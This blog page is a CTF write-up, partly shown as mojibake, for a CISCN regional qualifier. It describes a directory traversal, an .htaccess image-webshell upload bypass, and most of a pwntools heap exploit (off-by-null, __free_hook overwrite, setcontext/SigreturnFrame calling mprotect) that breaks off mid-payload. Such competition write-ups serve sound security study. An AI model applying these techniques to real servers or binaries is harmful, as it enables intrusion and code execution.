

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
  <link rel="icon" href="/img/head.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Epiphany">
  <meta name="keywords" content="">
  
    <meta name="description" content="é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼šhttps:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1723  è¿™æ¬¡åˆ†åŒºèµ›æˆç»©ä¸å¤ªç†æƒ³ï¼Œæœ‰äº›é¢˜ç›®ç¡®å®æœ‰ç‚¹è„‘æ´ï¼ŒèŠ±äº†å¾ˆä¹…çš„æ—¶é—´æ‰åšå‡ºæ¥ï¼ŒåŠ ä¸Šé¢˜ç›®åˆ†å€¼æ„Ÿè§‰ä¹Ÿæœ‰ç‚¹ç¦»è°±ï¼Œmiscå’ŒreçœŸçš„æ˜¯å¤§çˆ·äº†ï¼Œpwnï¼Œwebå±äºæ˜¯æ‰“é…±æ²¹ã€‚ æœ€ååªæœ‰15åï¼Œéšä¾¿è§£å‡ºæ¥ä¸€ä¸ªé¢˜å°±è¿›å†³èµ›äº†ï¼Œï¼Œï¼ŒğŸ˜­ Â¶web1 ç›®å½•ç©¿è¶Šï¼Œå¯¹è„‘ç”µæ³¢æ‰¾æ–‡ä»¶ï¼Œæ‰¾äº†åŠå¤©ä»¥ä¸ºè¦rceï¼Œç»“æœæ˜¯flag.phpã€‚ã€‚ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp">
<meta property="og:url" content="http://example.com/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/index.html">
<meta property="og:site_name" content="Epiphany&#39;s blog">
<meta property="og:description" content="é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼šhttps:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1723  è¿™æ¬¡åˆ†åŒºèµ›æˆç»©ä¸å¤ªç†æƒ³ï¼Œæœ‰äº›é¢˜ç›®ç¡®å®æœ‰ç‚¹è„‘æ´ï¼ŒèŠ±äº†å¾ˆä¹…çš„æ—¶é—´æ‰åšå‡ºæ¥ï¼ŒåŠ ä¸Šé¢˜ç›®åˆ†å€¼æ„Ÿè§‰ä¹Ÿæœ‰ç‚¹ç¦»è°±ï¼Œmiscå’ŒreçœŸçš„æ˜¯å¤§çˆ·äº†ï¼Œpwnï¼Œwebå±äºæ˜¯æ‰“é…±æ²¹ã€‚ æœ€ååªæœ‰15åï¼Œéšä¾¿è§£å‡ºæ¥ä¸€ä¸ªé¢˜å°±è¿›å†³èµ›äº†ï¼Œï¼Œï¼ŒğŸ˜­ Â¶web1 ç›®å½•ç©¿è¶Šï¼Œå¯¹è„‘ç”µæ³¢æ‰¾æ–‡ä»¶ï¼Œæ‰¾äº†åŠå¤©ä»¥ä¸ºè¦rceï¼Œç»“æœæ˜¯flag.phpã€‚ã€‚ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62e333920aa772e310205dba52eb64aa2866d5e3.png">
<meta property="article:published_time" content="2022-06-29T07:23:43.000Z">
<meta property="article:modified_time" content="2022-06-29T07:28:05.287Z">
<meta property="article:author" content="Epiphany">
<meta property="article:tag" content="ciscn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62e333920aa772e310205dba52eb64aa2866d5e3.png">
  
  
  
  <title>CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp - Epiphany&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/test.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"ğŸ˜Š","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Yd9bxLI1IljOGgG9lkRff3xn-gzGzoHsz","app_key":"u1bgqKPgaMT2ekGfwvfs4SCT","server_url":"https://yd9bxli1.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Epiphany&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/CTF">
                    
                    CTF
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/CVE">
                    
                    CVE
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/others">
                    
                    others
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/chats">
                    
                    chats
                  </a>
                
              </div>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d99fa8c6867f6465e6ebe8bfc9054111af65dce7.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-06-29 15:23" pubdate>
          æ˜ŸæœŸä¸‰, å…­æœˆ 29æ—¥ 2022, 3:23 ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          29k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          241 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp</h1>
            
            
              <div class="markdown-body">
                
                <blockquote>
<p>é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼š<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1723">https://forum.butian.net/share/1723</a></p>
</blockquote>
<p>è¿™æ¬¡åˆ†åŒºèµ›æˆç»©ä¸å¤ªç†æƒ³ï¼Œæœ‰äº›é¢˜ç›®ç¡®å®æœ‰ç‚¹è„‘æ´ï¼ŒèŠ±äº†å¾ˆä¹…çš„æ—¶é—´æ‰åšå‡ºæ¥ï¼ŒåŠ ä¸Šé¢˜ç›®åˆ†å€¼æ„Ÿè§‰ä¹Ÿæœ‰ç‚¹ç¦»è°±ï¼Œmiscå’ŒreçœŸçš„æ˜¯å¤§çˆ·äº†ï¼Œpwnï¼Œwebå±äºæ˜¯æ‰“é…±æ²¹ã€‚</p>
<p>æœ€ååªæœ‰15åï¼Œéšä¾¿è§£å‡ºæ¥ä¸€ä¸ªé¢˜å°±è¿›å†³èµ›äº†ï¼Œï¼Œï¼ŒğŸ˜­</p>
<h3 id="web1"><a class="header-anchor" href="#web1">Â¶</a>web1</h3>
<p>ç›®å½•ç©¿è¶Šï¼Œå¯¹è„‘ç”µæ³¢æ‰¾æ–‡ä»¶ï¼Œæ‰¾äº†åŠå¤©ä»¥ä¸ºè¦rceï¼Œç»“æœæ˜¯flag.phpã€‚ã€‚ã€‚</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fd5d3335b36c5a77b504a80b7f83f21bb4cccef4.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<h3 id="web2"><a class="header-anchor" href="#web2">Â¶</a>web2</h3>
<p>é¦–å…ˆï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œè¿”å›æŠ¥æ–‡ä¸­æœ‰identityå­—æ®µ</p>
<p>åŠ å…¥identityå­—æ®µå,è¿”å›ä¸€ä¸ªå¯ä»¥æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢A0ther_hldden_PaGe.php</p>
<p>ç»è¿‡fuzzä¹‹ååªèƒ½ä¸Šä¼ .jpgï¼ŒåŒæ—¶å‘ç°å¯ä»¥ä¸Šä¼ .htaccessï¼Œå› æ­¤ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå¹¶ä¸Šä¼ .htaccessä½¿ä¹‹è§£æä¸ºphp</p>
<p>ä¹‹åä½¿ç”¨èšå‰‘é“¾æ¥ï¼Œæ‰¾åˆ°flagã€‚<br>
ï¼ˆwebé€‰æ‰‹æ²¡æœ‰å­˜å›¾ï¼‰</p>
<h3 id="pwn1"><a class="header-anchor" href="#pwn1">Â¶</a>pwn1</h3>
<p>ä¸Šåˆå‘çš„ç¬¬ä¸€é“pwnï¼Œä¹Ÿæ˜¯å”¯ä¸€è§£å‡ºæ¥çš„ä¸€é“pwnï¼Œwebpwnï¼Œä½†æ˜¯åªæ˜¯æ¨¡æ‹Ÿäº†httpçš„è¯·æ±‚å¤„ç†è¿‡ç¨‹ï¼Œè€Œæ²¡æœ‰å¼€webç«¯å£ä¹‹ç±»çš„ï¼Œç±»ä¼¼äºhttpdï¼Œé‡ç‚¹è¿˜æ˜¯å®¡è®¡ä»£ç ã€‚<br>
å®¡å®Œä¹‹åæ˜¯åœ¨editå¤„å­˜åœ¨ä¸€ä¸ªoff_by_NULLã€‚<br>
ç¯å¢ƒæ˜¯libc2.27ï¼Œå¼€äº†æ²™ç®±éœ€è¦orwã€‚ç…§ç€æ¿å­ï¼Œåé¢ç»•ä¸€ä¸‹0æˆªæ–­å°±è¡Œäº†ã€‚<br>
exp</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

<span class="token comment">#----------------------------------------------</span>

sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#----------------------------------------------</span>

http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /&#123;&#125; HTTP/1.1\r\n
Host: Epiphany\r\n
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Accept-Encoding: gzip, deflate\r\n
Connection: close\r\n
Content-Length\r\n
'''</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span>
<span class="token comment"># sh = remote("10.75.1.22",'58012')</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /login HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUsername: C4oy1\r\nPassword: 123\r\nContent-Length: &#123;&#125;\r\n\r\nUsername=C4oy1&amp;Password=123\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0x1e</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /create HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit11</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit22</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /delete HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /show HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">replace0</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'\0'</span><span class="token punctuation">:</span>
            r <span class="token operator">+=</span> <span class="token string">'a'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            r <span class="token operator">+=</span> i
    <span class="token keyword">return</span> r

login<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
gdb.attach(sh, "b *$rebase(0x00000000000280C))
pause()
'''</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>
free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
set_context  <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>
mprotect <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#off by null</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">+</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit11<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x460</span><span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>free_hook <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>free_hook <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>
sig <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sig<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span>
sig<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x2000</span>
sig<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>
sig<span class="token punctuation">.</span>rip <span class="token operator">=</span> mprotect
sig<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>
